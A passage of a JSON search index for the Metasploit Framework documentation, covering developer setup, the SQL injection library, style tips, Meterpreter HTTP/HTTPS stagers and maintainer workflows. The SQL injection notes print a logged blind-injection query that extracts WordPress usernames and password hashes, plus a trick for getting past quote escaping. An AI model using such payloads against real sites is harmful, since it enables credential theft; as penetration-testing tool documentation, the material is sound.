associate your public SSH key with your GitHub account, otherwise if you set up a SSH key and don’t associate it with your GitHub account, you will receive this “permission denied” error. | To receive updates, you will create an upstream-master branch to track the Rapid7 remote repository, alongside your master branch which will point to your personal repository’s fork: . | . git remote add upstream git@github.com:rapid7/metasploit-framework.git git fetch upstream git checkout -b upstream-master --track upstream/master . | Configure your Github username, email address, and username. Ensure your user.email matches the email address you registered with your Github account. | . git config --global user.name \"$GITHUB_USERNAME\" git config --global user.email \"$GITHUB_EMAIL\" git config --global github.user \"$GITHUB_USERNAME\" . | Set up msftidy to run before each git commit and after each git merge to quickly identify potential issues with your contributions: | . cd ~/git/metasploit-framework ln -sf ../../tools/dev/pre-commit-hook.rb .git/hooks/pre-commit ln -sf ../../tools/dev/pre-commit-hook.rb .git/hooks/post-merge . ",
    "url": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#install-dependencies",
    "relUrl": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#install-dependencies"
  },"557": {
    "doc": "Setting Up a Metasploit Development Environment",
    "title": "Install Ruby",
    "content": "Linux distributions do not ship with the latest Ruby, nor are package managers routinely updated. Additionally, if you are working with multiple Ruby projects, each one has dependencies and Ruby versions which can start to conflict. For these reasons, it is advisable to use a Ruby manager. You could just install Ruby directly (eg. sudo apt install ruby-dev), but you may likely end up with the incorrect version and no way to update. Instead, consider using one of the many different Ruby environment managers available. The Metasploit team prefers rbenv and rvm (note that rvm does require a re-login to complete). Regardless of your choice, you’ll want to make sure that, when inside the ~/git/metasploit-framework directory, you are running the correct version of Ruby: . $ cd ~/git/metasploit-framework $ cat .ruby-version 3.0.2 $ ruby -v ruby 3.0.2p107 (2021-07-07 revision 0db68f0233) [x86_64-linux] . Note: the Ruby version is likely to change over time, so don’t rely on the output in the above example. Instead, confirm your ruby -v output with the version number listed in the .ruby-version file. If the two versions don’t match, restart your terminal. If that does not work, consult the troubleshooting documentation for your Ruby environment manager. Unfortunately, troubleshooting the Ruby environment is beyond the scope of this document, but feel free to reach out for community support using the links at the bottom of this document. ",
    "url": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#install-ruby",
    "relUrl": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#install-ruby"
  },"558": {
    "doc": "Setting Up a Metasploit Development Environment",
    "title": "Install Gems",
    "content": "Before you run Metasploit, you will need to update the gems (Ruby libraries) that Metasploit depends on: . cd ~/git/metasploit-framework/ gem install bundler bundle install . If you encounter an error with the above command, refer to the bundle output and search for the error message along with the name of the gem that failed. Likely, you’ll need to apt get install a dependency that is required by that particular gem. Congratulations! You have now set up a development environment and the latest version of the Metasploit Framework. If you followed this guide step-by-step, and you ran into any problems, it would be super great if you could open a new issue so we can either help you, or, more likely, update the docs. ",
    "url": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#install-gems",
    "relUrl": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#install-gems"
  },"559": {
    "doc": "Setting Up a Metasploit Development Environment",
    "title": "Optional: Set up the REST API and PostgreSQL database",
    "content": "The following optional section describes how to manually install PostgreSQL and set up the Metasploit database. Alternatively, use our Omnibus installer which handles this more reliably. | Confirm that the PostgreSQL server and client are installed: | . sudo apt update &amp;&amp; sudo apt-get install -y postgresql postgresql-client sudo service postgresql start &amp;&amp; sudo update-rc.d postgresql enable . | Ensure that you are not running as the root user. | Initialize the Metasploit database: . | . cd ~/git/metasploit-framework ./msfdb init . | If you receive an error about a component not being installed, confirm that the binaries shown are in your path using the which and find commands, then modifying your $PATH environment variable. If it was something else, open a new issue to let us know what happened. | If the msfdb init command succeeds, then confirm that the database is accessible to Metasploit: . | . $ ./msfconsole -qx \"db_status; exit\" . Congratulations! You have now set up the Metasploit Web Service (REST API) and the backend database. ",
    "url": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#optional-set-up-the-rest-api-and-postgresql-database",
    "relUrl": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#optional-set-up-the-rest-api-and-postgresql-database"
  },"560": {
    "doc": "Setting Up a Metasploit Development Environment",
    "title": "Optional: Tips to speed up common workflows",
    "content": "The following section is optional but may improve your efficiency. Making sure you’re in the right directory to run msfconsole can become tedious, so consider using the following Bash alias: . echo 'alias msfconsole=\"pushd $HOME/git/metasploit-framework &amp;&amp; ./msfconsole &amp;&amp; popd\"' &gt;&gt; ~/.bash_aliases . Consider generating a GPG key to sign your commits. Read about why and how. Once you have done this, consider enabling automatic signing of all your commits with the following command: . cd *path to your cloned MSF repository on disk* git config commit.gpgsign true . Developers tend to customize their own git aliases to speed up common commands, but here are a few common ones: . [alias] # An easy, colored oneline log format that shows signed/unsigned status nicelog = log --pretty=format:'%Cred%h%Creset -%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%aE&gt;%Creset [%G?]' # Shorthand commands to always sign (-S) and always edit the commit message. m = merge -S --no-ff --edit c = commit -S --edit # Shorthand to always blame (praise) without looking at whitespace changes b= blame -w . If you plan on working with other contributor’s pull requests, you may run the following script which makes it easier to do so: . tools/dev/add_pr_fetch.rb . After running the above script, you can checkout other pull requests more easily: . git fetch upstream git checkout fixes-to-pr-12345 upstream/pr/12345 . If you’re writing test cases (which you should), then make sure rspec works: . rake spec . You should see over 9000 tests run, mostly resulting in green dots, a few in yellow stars, and no red errors. ",
    "url": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#optional-tips-to-speed-up-common-workflows",
    "relUrl": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#optional-tips-to-speed-up-common-workflows"
  },"561": {
    "doc": "Setting Up a Metasploit Development Environment",
    "title": "Great!  Now what?",
    "content": "We’re excited to see your upcoming contributions of new modules, documentation, and fixes! Check out our wiki documentation and, if you’re looking for inspiration, keep an eye out for newbie-friendly pull requests and issues. Please submit your new pull requests and reach out to us on Slack for community help. Finally, we welcome your feedback on this guide, so feel free to reach out to us on Slack or open a new issue. For their significant contributions to this guide, we would like to thank @kernelsmith, @corelanc0d3r, and @ffmike. ",
    "url": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#great--now-what",
    "relUrl": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html#great--now-what"
  },"562": {
    "doc": "Setting Up a Metasploit Development Environment",
    "title": "Setting Up a Metasploit Development Environment",
    "content": "The shortlink to this wiki page is https://r-7.co/MSF-DEV . This is a guide for setting up a developer environment to contribute modules, documentation, and fixes to the Metasploit Framework. If you just want to use Metasploit for legal, authorized hacking, we recommend instead you: . | Install the open-source Omnibus installer, or | Use the pre-installed Metasploit on Kali Linux or Parrot Linux. | . If you want to contribute to Metasploit, start by reading our CONTRIBUTING.md, then follow the rest of this guide. ",
    "url": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html",
    "relUrl": "/docs/development/get-started/setting-up-a-metasploit-development-environment.html"
  },"563": {
    "doc": "SQL Injection",
    "title": "Supported Databases",
    "content": ". | MySQL/MariaDB (#13596) | SQLite (#13847) | PostgreSQL (#14067) | . ",
    "url": "/docs/development/developing-modules/libraries/sql-injection-libraries.html#supported-databases",
    "relUrl": "/docs/development/developing-modules/libraries/sql-injection-libraries.html#supported-databases"
  },"564": {
    "doc": "SQL Injection",
    "title": "Supported Techniques",
    "content": ". | Boolean Based Blind | Time Based Blind | . |   | MySQL/MariaDB | SQLite | Postgres | . | Boolean Based Blind | X | X | X | . | Time Based Blind | X | X | X | . ",
    "url": "/docs/development/developing-modules/libraries/sql-injection-libraries.html#supported-techniques",
    "relUrl": "/docs/development/developing-modules/libraries/sql-injection-libraries.html#supported-techniques"
  },"565": {
    "doc": "SQL Injection",
    "title": "How to use in a module",
    "content": "You’ll need to start off by including the library. include Msf::Exploit::SQLi . Next we create our SQLi object: . sqli = create_sqli(dbms: MySQLi::Common, opts: sqli_opts) do |payload| # Here is where we write in what to do each request using #{payload} as the spot to inject end . dbms can be set to either Common if the DB isn’t know, or one of the other databases and methods if it is known ahead of time such as SQLitei::BooleanBasedBlind sqli_opts is a hash containing all of the options. ",
    "url": "/docs/development/developing-modules/libraries/sql-injection-libraries.html#how-to-use-in-a-module",
    "relUrl": "/docs/development/developing-modules/libraries/sql-injection-libraries.html#how-to-use-in-a-module"
  },"566": {
    "doc": "SQL Injection",
    "title": "Notes",
    "content": "run_sql . run_sql can only return 1 column. magic_quotes bypass . CAN ONLY RETURN ONE COLUMN AT A TIME . At times, PHP will use magic_quotes to escape ' and \". This may cause problems in the SQL injection. You’ll know its a problem, because you’ll see log items like this: . [Sat Jan 02 14:11:53.103512 2021] [php7:notice] [pid 55607] [client 2.2.2.2:36475] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\\\\';\\\\',ifnull(user_login,\\\\'\\\\'),ifnull(user_pass,\\\\'\\\\')) as binary) mMJZrCxQ from w' at line 1 for query SELECT * FROM wp_chopslider3 WHERE chopslider_id =938076279 OR 1=1 AND if(length(cast((select group_concat(mMJZrCxQ) from (select cast(concat_ws(\\\\';\\\\',ifnull(user_login,\\\\'\\\\'),ifnull(user_pass,\\\\'\\\\')) as binary) mMJZrCxQ from wp_users limit 1) fWLwo) as binary))&amp;1&lt;&gt;0,sleep(1.0),0) . However, the query was similar to this: . [*] {SQLi} Executing (select group_concat(qcO) from (select cast(concat_ws(';',to_base64(ifnull(user_login,'')),to_base64(ifnull(user_pass,''))) as binary) qcO from wp_users limit 1) dTWyw) . The query was sent without the escapes, however they were added. The solution is to avoid quotes at all. To do this, we will need to use the hex encoder . if payload.include?(\"''\") payload.gsub!(\"''\", 'hex(0x00)') end . This will convert all instances of '' which were previously being escaped to \\'\\' to hex(0x00) which does not get altered. ",
    "url": "/docs/development/developing-modules/libraries/sql-injection-libraries.html#notes",
    "relUrl": "/docs/development/developing-modules/libraries/sql-injection-libraries.html#notes"
  },"567": {
    "doc": "SQL Injection",
    "title": "SQL Injection",
    "content": "SQL Injection library support was added in 2020 by @red0xff during the Google Summer of Code. ",
    "url": "/docs/development/developing-modules/libraries/sql-injection-libraries.html",
    "relUrl": "/docs/development/developing-modules/libraries/sql-injection-libraries.html"
  },"568": {
    "doc": "Style Tips",
    "title": "Style Tips",
    "content": " ",
    "url": "/docs/development/quality/style-tips.html",
    "relUrl": "/docs/development/quality/style-tips.html"
  },"569": {
    "doc": "Style Tips",
    "title": "Editor configuration",
    "content": "Having your editor take care of formatting for you can save headaches during the acceptance process. Most Metasploit contributors use vim and/or gvim as a default text editor – if you have a configuration for some other editor, we’d love to see it! . VIM and GVIM . Adding the following settings to your .vimrc will make conforming to the CONTRIBUTING.md and msftidy.rb guidelines considerably easier. Incidentally, if you install the Janus Distribution of vim plugins, this is all done for you, and more, automatically. But, if you are a special snowflake, here’s how to limp your way to code formatting excellence. set shiftwidth=2 tabstop=2 softtabstop=2 \" textwidth affects `gq` which is handy for formatting comments set textwidth=78 \" Metasploit requires spaces instead of hard tabs set expandtab \" Highlight spaces at EOL and mixed tabs and spaces. hi BogusWhitespace ctermbg=darkgreen guibg=darkgreen match BogusWhitespace /\\s\\+$\\|^\\t\\+ \\+\\|^ \\+\\t\\+/ . If you’d rather these settings only apply to ruby files, you can use an autogroup and autocommands. if !exists(\"au_loaded\") let au_loaded = 1 augroup rb au FileType ruby set shiftwidth=2 tabstop=2 softtabstop=2 textwidth=78 au FileType ruby set expandtab au FileType ruby hi BogusWhitespace ctermbg=darkgreen guibg=darkgreen au FileType ruby match BogusWhitespace /\\s\\+$\\|^\\t\\+ \\+\\|^ \\+\\t\\+/ augroup END endif . You can also use :set list to see all whitespace as distinct characters to make it easier to see errant whitespace. Rubymine . Given the switch to using standard Ruby indentation, there is no special configuration needed for RubyMine any longer. Two-space tabs for life! . ",
    "url": "/docs/development/quality/style-tips.html#editor-configuration",
    "relUrl": "/docs/development/quality/style-tips.html#editor-configuration"
  },"570": {
    "doc": "Style Tips",
    "title": "Grammar and capitalization",
    "content": "While we understand that the world reads many, many languages, Metasploit is developed primarily in U.S English. Therefore, description grammar in modules should adhere to U.S. English conventions. Doing so not only ensures ease of use for the majority of Metasploit users, but also helps automatic (and manual) translators for other languages. Titles . Module titles should read like titles. For capitalization rules in English, see: http://owl.english.purdue.edu/owl/resource/592/01/ . The only exceptions are function names (like thisFunc()) and specific filenames (like thisfile.ocx). ",
    "url": "/docs/development/quality/style-tips.html#grammar-and-capitalization",
    "relUrl": "/docs/development/quality/style-tips.html#grammar-and-capitalization"
  },"571": {
    "doc": "The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers",
    "title": "Windows HTTP APIs",
    "content": "The Windows API comes with two ways to talk via HTTP/S, they are WinInet and WinHTTP. The APIs are consumed in a similar fashion; many of the functions in each have the same interface, or are at least close enough to make a transition between the two rather trivial. However, there are some underlying differences that are important. The WinInet API was designed for use in desktop applications. It provides all the features required by applications to use HTTP/S while delegating much of the responsibilty of handling implementation detail to the underlying API and OS. This API can result in some user interface elements appearing if not handled correctly. WinInet comes with some limitations, one of which is that it’s close to impossible to do any kind of custom validation, parsing, or handling of SSL communications. One of the needs of Metasploit users is to be able to enable a Paranoid Mode that forces Meterpreter to only talk with the appropriate endpoint. The goal is to prevent shells from being hijacked by unauthorised users. In order to do this, one of the things that was implemented was the verification of the SHA1 hash of the SSL certificate that Meterpreter reads from the server. If this hash doesn’t match the one that Meterpreter is configured with, Meterpreter will shut down. WinInet doesn’t make this process possible without a lot of custom work. For applications such as this, WinHTTP is the “preferred” option as deemed by Microsoft. This API is designed to work under a service, and provides a greater number of ways to interact with communications made over HTTP/S. With this API it was trivial to implement the SHA1 hash verification and force Meterpreter to shut down when a MITM is detected. For a full comparison of the feature differences, please see this feature matrix on MSDN. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html#windows-http-apis",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html#windows-http-apis"
  },"572": {
    "doc": "The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers",
    "title": "Meterpreter’s Implementation",
    "content": "Meterpreter now makes use of WinHTTP by default so that the new features are accommodated, but unfortuanetly this doesn’t come for free. Behind the scenes, this API does not make any use of the current user’s Internet Explorer configuration settings, where the WinInet API does. This means that if the current user has a proxy configured, extra code needs to be added to make use of the current Internet Explorer settings in WinHTTP. Meterpreter has been modified to do this, however there is still one limitation that is in place. As indicated in a blog post on MSDN: . WinHTTP strictly requires HTTP/1.1 compliance for keeping the connection alive and HTTP Keep-Alives are not supported in HTTP/1.0 protocol. HTTP Keep-Alive feature was introduced in the HTTP/1.1 protocol as per RFC 2616. The server or the proxy which expects the keep-alive should also implement the protocol correctly. WinHTTP on Windows 7, Windows 2008 R2 are strict in terms of security wrto protocol compliance. The ideal solution is to change the server/proxy to use the right protocol and be RFC compliant. What this means is that from Windows 7 and onwards, the underlying WinHTTP implementation requires proper HTTP/1.1 support from any proxies that are used. If a proxy uses HTTP/1.0, such as Squid 2.7, and requires Keep-Alive support, such as NTLM authentication, then WinHTTP will refuse to talk to it. Instead of downgrading, it will expect a purely RFC-compliant implementation, and instead will return a 407 error the client. This means that for Meterpreter to work, WinHTTP can’t be used. In order to avoid this issue, extra work has beeen done to force Meterpreter to fall back to WinInet when this happens. Given that WinInet doesn’t do certificate hash verification, this means that the user of Meterpreter loses the ability to use paranoid mode. It was decided that Meterpreter would not fallback to WinInet if paranoid mode was enabled, as the intention of the user is clearly to avoid MITM. To sum up, Meterpreter will use WinHTTP where it can. If it can’t, it’ll fall back to WinInet unless paranoid mode is enabled. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html#meterpreters-implementation",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html#meterpreters-implementation"
  },"573": {
    "doc": "The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers",
    "title": "Metasploit HTTP and HTTPS Stagers",
    "content": "Metasploit users have long since known about the reverse_http and reverse_https stagers, and have made good use of them over time. What many don’t know is that these stagers use the WinInet API, which means that they don’t get SSL certificate validation (so no paranoid mode). To provide support for paranoid mode directly inside the stager, ultimately preventing the download of Meterpreter at all in the case of MITM, new stagers were required. reverse_winhttp and reverse_winhttps are implementations of stagers that make use of WinHTTP, and in the latter case, provides support for paranoid mode. They do, however come with the same implicit limitation as Meterpreter itself in that they may not be able to provide proxy support thanks to the strict RFC compliance described in the previous section. The big difference here is that the stager does not have a fallback implementation like Meterpreter does, as this would make the stager way too big. Therefore, if an older proxy is in place that doesn’t confirm to HTTP/1.1, the stager will fail. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html#metasploit-http-and-https-stagers",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html#metasploit-http-and-https-stagers"
  },"574": {
    "doc": "The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers",
    "title": "Combining Stagers with Meterpreter",
    "content": "It’s important to note that the implementations of communications inside the stagers are completely separate to those inside Meterpreter. If you use windows/meterpreter/reverse_https, then the stager will use WinInet and Meterpreter will use WinHTTP. It isn’t possible to “hand over” communications from the stager to Meterpreter in this case, and it wouldn’t make sense anyway because HTTP/S is stateless. This is the most common set up because many people don’t realise that the reverse_winhttp/s payloads exist! . Prior to the WinInet fallback work, those people hitting the HTTP/1.0 proxy issue would find themselves with the following scenario: . | They would exploit a Windows 7 (or later) target in some way, whether it be via a browser exploit, or through a social engineering attack. | The payload that was executed was meterpreter/reverse_https, and so the initial connection would come via WinInet. | WinInet would successfully use the current user’s proxy configuration and the initial connection back to Metasploit would be successful. | The stager would download the second stage (metsrv), and reflectively load it so that Meterpreter could take over. | Meterpreter would attempt to connect again to Metasploit, this time using WinHTTP. | The proxy would return HTTP/1.0 responses, resulting in WinHTTP refusing to function. | The Meterpreter session would be considered “dead” by Metasploit as a result of the lack of successful communications after staging. | . Examples of these issues are this and this. If you are seeing similar issues it’s because your current Meterpreter binaries don’t have the fallback option. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html#combining-stagers-with-meterpreter",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html#combining-stagers-with-meterpreter"
  },"575": {
    "doc": "The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers",
    "title": "Conclusion",
    "content": "HTTP/S communications in Windows is a hairy beast, and trying to cater for all cases proves to be quite tricky thanks to the limitations of some APIs, and the variable implementations of others. We’re still working to iron out all of issues, and so please log an issue if you stumble on an edge case that hasn’t yet been covered. Thank you for your patience! . OJ / @TheColonial . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html#conclusion",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html#conclusion"
  },"576": {
    "doc": "The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers",
    "title": "The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers",
    "content": "Recent changes to HTTP and HTTPS communications in both Meterpreter and its stagers have caused new behaviours that have left some users confused. The aim of this post is to cover the changes that have been made, the rationale behind those changes, and the issues that come with them. By the end of this post, readers should have a clear understanding of the issues related to HTTP/S communications, and be able to diagnose and fix any issues that they might be having. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html"
  },"577": {
    "doc": "Uberhandler",
    "title": "Current Design",
    "content": "Metasploit payload modules are Ruby Modules and come in three types: . | Payload::Type::Single | Payload::Type::Stage | Payload::Type::Stager | . Payloads are created by creating an anonymous Class and including mixins for a Handler and either a single-stage payload or both a stage and stager, like so: . def build_payload(*modules) klass = Class.new(Payload) # Remove nil modules modules.compact! # Include the modules supplied to us with the mad skillz # spoonfu style klass.include(*modules.reverse) return klass end . The result is a Class for each combination of stage + stager + handler. E.g., windows/meterpreter/reverse_tcp includes Msf::Handler::ReverseTcp and the Modules defined in modules/payloads/stagers/windows/reverse_tcp and modules/payloads/stages/windows/meterpreter. As a corollary, this means that stages and stagers are intricately linked with each other and their handlers. ",
    "url": "/docs/development/propsals/uberhandler.html#current-design",
    "relUrl": "/docs/development/propsals/uberhandler.html#current-design"
  },"578": {
    "doc": "Uberhandler",
    "title": "What we need",
    "content": "For the Uberhandler to function, it needs to: . | Track how many exploits currently need its services | Be independent of the payload modules that use it | . The stagers need to: . | Communicate to the handler what kind of stage to send | . From a user’s perspective, we need some way to indicate a generic payload type along with the handler. The generic handlers were an early attempt at providing this same concept. Perhaps something like: . set PAYLOAD uber/meterpreter/reverse_tcp . ",
    "url": "/docs/development/propsals/uberhandler.html#what-we-need",
    "relUrl": "/docs/development/propsals/uberhandler.html#what-we-need"
  },"579": {
    "doc": "Uberhandler",
    "title": "Uberhandler",
    "content": " ",
    "url": "/docs/development/propsals/uberhandler.html",
    "relUrl": "/docs/development/propsals/uberhandler.html"
  },"580": {
    "doc": "Unstable Modules",
    "title": "Landing to Unstable",
    "content": "Unstable modules have their own special directory structure – they should not hit the regular modules/ subdirectory, since we don’t want to conflict with existing or future modules. We also want to make it easy to spot which modules are unstable. So, new modules should get landed there with the following procedure. | First, get unstable up to date with upstream/master: git checkout unstable; git merge upstream/master; push upstream | Create a local branch off of the PR: git checkout -b temp-pr1234 --track upstream/pr/1234 | Create a local branch off of unstable: git checkout -b unstable-pr1234-modulename --track upstream/unstable | Find the module paths: git diff upstream/master...upstream/pr/1234 --name-only | Git checkout the module(s) in question: git checkout temp-pr1234 modules/exploits/path/to/module.rb | Move the files to the appropriate directory: git mv modules/exploits/path/to/module.rb unstable-modules/exploits/incomplete | Commit the result: git commit | Send a pull request targeting the unstable branch, not the master branch: https://github.com/YOUR GITHUB USERNAME/metasploit-framework/compare/rapid7:unstable…unstable-pr1234-modulename?expand=1 . Be sure to mention the original pull request number in the description so the PR will be updated accordingly. | . This assumes you’re set up for development using the instructions mentioned at https://r-7.co/MSF-DEV and have configured Rapid7’s branch as the “upstream” repo. ",
    "url": "/docs/development/maintainers/process/unstable-modules.html#landing-to-unstable",
    "relUrl": "/docs/development/maintainers/process/unstable-modules.html#landing-to-unstable"
  },"581": {
    "doc": "Unstable Modules",
    "title": "Example",
    "content": "For an example of this procedure, see PR #2801. ",
    "url": "/docs/development/maintainers/process/unstable-modules.html#example",
    "relUrl": "/docs/development/maintainers/process/unstable-modules.html#example"
  },"582": {
    "doc": "Unstable Modules",
    "title": "Unstable Libraries",
    "content": "If someone has library changes that cannot be merged to master, we cannot hang on to them in unstable. There is no sensible way to maintain that kind of branch over any reasonable time period, since conflicts will surely abound soon. Unstable scripts and plugins are okay, though. ",
    "url": "/docs/development/maintainers/process/unstable-modules.html#unstable-libraries",
    "relUrl": "/docs/development/maintainers/process/unstable-modules.html#unstable-libraries"
  },"583": {
    "doc": "Unstable Modules",
    "title": "Rescuing unstable modules",
    "content": "If you’d like to rescue an unstable module, great! Just note that it’s an unstable rescue in the pull request, and the original PR number (if you can find it), when you pull it back out. You can do a similiar git checkout to grab the file and then git mv it to the right spot again. ",
    "url": "/docs/development/maintainers/process/unstable-modules.html#rescuing-unstable-modules",
    "relUrl": "/docs/development/maintainers/process/unstable-modules.html#rescuing-unstable-modules"
  },"584": {
    "doc": "Unstable Modules",
    "title": "Safety",
    "content": "This is not unstable in the Debian sense – they’re not latest versions, they get no fixes unless someone adopts them, and they may end up crashing out all of framework when loaded. No guarantees are made, ever, despite things like ExploitRanking. ",
    "url": "/docs/development/maintainers/process/unstable-modules.html#safety",
    "relUrl": "/docs/development/maintainers/process/unstable-modules.html#safety"
  },"585": {
    "doc": "Unstable Modules",
    "title": "Unstable Modules",
    "content": "Sometimes, modules contributed to Metasploit don’t quite cross the finish line. This can be for a variety of reasons. Most often, it is because the module submission was a “drive-by” – the original author is not interested (or not able) to implement and test needed changes in order to make the module production worthy. Luckily, git makes it easy to be a pack rat for these unfinished modules. We have a separate branch for these unstable modules, imaginatively named, Unstable. ",
    "url": "/docs/development/maintainers/process/unstable-modules.html",
    "relUrl": "/docs/development/maintainers/process/unstable-modules.html"
  },"586": {
    "doc": "Using Git",
    "title": "Using Git",
    "content": "Use this collection of resources to work with the Metasploit Framework’s git repository. | Cheatsheet | Reference Sites | Setting Up a Metasploit Development Environment - this will walk you through creating a pull request | Landing Pull Requests - this is the procedure that Metasploit core devs go through to merge your request | Remote Branch Pruning | . A fork is when you snapshot someone else’s codebase into your own repo, presumably on github.com, and that codebase may have it’s own branches, but you are usually snapshotting the master branch. You usually then clone your fork to your local machine. You then create your own branches, which are offshoots of your own fork. Those snapshots, even if pushed to your github are not a part of the original codebase, in this case rapid7/metasploit-framework. If you then submit a pull request, your branch (generally) can be pulled into the original codebase’s master branch (usually… you could be pulled into an experimental branch or something if your code was a massive change or something, but that’s not typical). You only fork once, you clone as many times as you have machines on which you want to code, and you branch, commit, and push as often as you like (you don’t always have to push, you can push later or not at all, but you’ll have to push before doing a pull request, a.k.a. PR), and you submit a PR when you are ready. See below . github.com/rapid7/metasploit-framework --&gt; fork --&gt; github.com/&lt;...&gt;/metasploit-framework ^ | git clone git://github.com/&lt;...&gt;/metasploit-framework.git | `-- accepted &lt;-- pull request V ^ /home/&lt;...&gt;/repo/metasploit-framework | | github.com/&lt;...&gt;/metasploit-framework/branch_xyz | | | V V | V branch_abc ... `-- push &lt;-- branch_xyz . (Thanks to kernelsmith for this excellent description) . ",
    "url": "/docs/development/get-started/git/using-git.html",
    "relUrl": "/docs/development/get-started/git/using-git.html"
  },"587": {
    "doc": "Using local Gems",
    "title": "Introduction",
    "content": "Often times when testing Gem file updates, particularly from other repositories such as rex-powershell or rex-text, one will need to find some way of testing whether the updated Gem file works as expected within Metasploit Framework. There are many different ways to do this, however this guide will only focus on one method for simplicities sake, as this is the one that has been known to work with the least amount of prerequisite setup. ",
    "url": "/docs/development/maintainers/ruby-gems/using-local-gems.html#introduction",
    "relUrl": "/docs/development/maintainers/ruby-gems/using-local-gems.html#introduction"
  },"588": {
    "doc": "Using local Gems",
    "title": "Instructions",
    "content": ". | Set up a working Metasploit development setup as described at the Setting Up a Development Environment wiki page. Be sure to set up your SSH keys as part of this setup. | Clone whatever PR it is that you wish to work on. For example to work on https://github.com/rapid7/rex-text/pull/30, do git clone git@github.com:rapid7/rex-text.git, then cd rex-text, followed by git checkout origin/pr/30. | Go to the location of your git clone of Metasploit Framework and do cp Gemfile.local.example Gemfile.local. Ensure that no file named Gemfile.local.lock exists. If one does, remove it. | Inside your Gemfile.local file, edit it so it looks something like the following: | . ## # Example Gemfile.local file for Metasploit Framework # # The Gemfile.local file provides a way to use other gems that are not # included in the standard Gemfile provided with Metasploit. # This filename is included in Metasploit's .gitignore file, so local changes # to this file will not accidentally show up in future pull requests. This # example Gemfile.local includes all gems in Gemfile using instance_eval. # It also creates a new bundle group, 'local', to hold additional gems. # # This file will not be used by default within the framework. As such, one # must first install the custom Gemfile.local with bundle: # bundle install --gemfile Gemfile.local # # Note that msfupdate does not consider Gemfile.local when updating the # framework. If it is used, it may be necessary to run the above bundle # command after the update. # ### # Include the Gemfile included with the framework. This is very # important for picking up new gem dependencies. msf_gemfile = File.join(File.dirname(__FILE__), 'Gemfile') if File.readable?(msf_gemfile) instance_eval(File.read(msf_gemfile)) end # Create a custom group group :local do gem 'rex-powershell', path: '/home/gwillcox/git/rex-powershell' end . Notice in particular the final part of this code: . # Create a custom group group :local do gem 'rex-powershell', path: '/home/gwillcox/git/rex-powershell' end . For each gem you want to test, you will need both the name of the gem, for example rex-powershell or rex-text, followed by path: and the path where the corresponding Git repository for that gem is on disk. Do this for each custom gem that you want to test out, then save and close Gemfile.local. | Whilst still inside the cloned Metasploit Framework git repository, execute bundle install --gemfile Gemfile.local. You should see a line similar to the following: | . Using rex-powershell 0.1.87 from source at `/home/gwillcox/git/rex-powershell` . | If any errors occur, follow the directions in the output to try and resolve the conflicts. If all else fails, delete Gemfile.local.lock and run bundle install --gemfile Gemfile.local again. | . ",
    "url": "/docs/development/maintainers/ruby-gems/using-local-gems.html#instructions",
    "relUrl": "/docs/development/maintainers/ruby-gems/using-local-gems.html#instructions"
  },"589": {
    "doc": "Using local Gems",
    "title": "Using local Gems",
    "content": " ",
    "url": "/docs/development/maintainers/ruby-gems/using-local-gems.html",
    "relUrl": "/docs/development/maintainers/ruby-gems/using-local-gems.html"
  },"590": {
    "doc": "Running modules",
    "title": "Getting started",
    "content": "Depending on your skill level - if you have no experience with Metasploit, the following resources may be a better starting point: . | https://tryhackme.com/room/rpmetasploit | http://www.offensive-security.com/metasploit-unleashed/Main_Page | https://metasploit.help.rapid7.com/docs/ | https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/ | https://github.com/rapid7/metasploitable3 | . ",
    "url": "/docs/using-metasploit/basics/using-metasploit.html#getting-started",
    "relUrl": "/docs/using-metasploit/basics/using-metasploit.html#getting-started"
  },"591": {
    "doc": "Running modules",
    "title": "Overview",
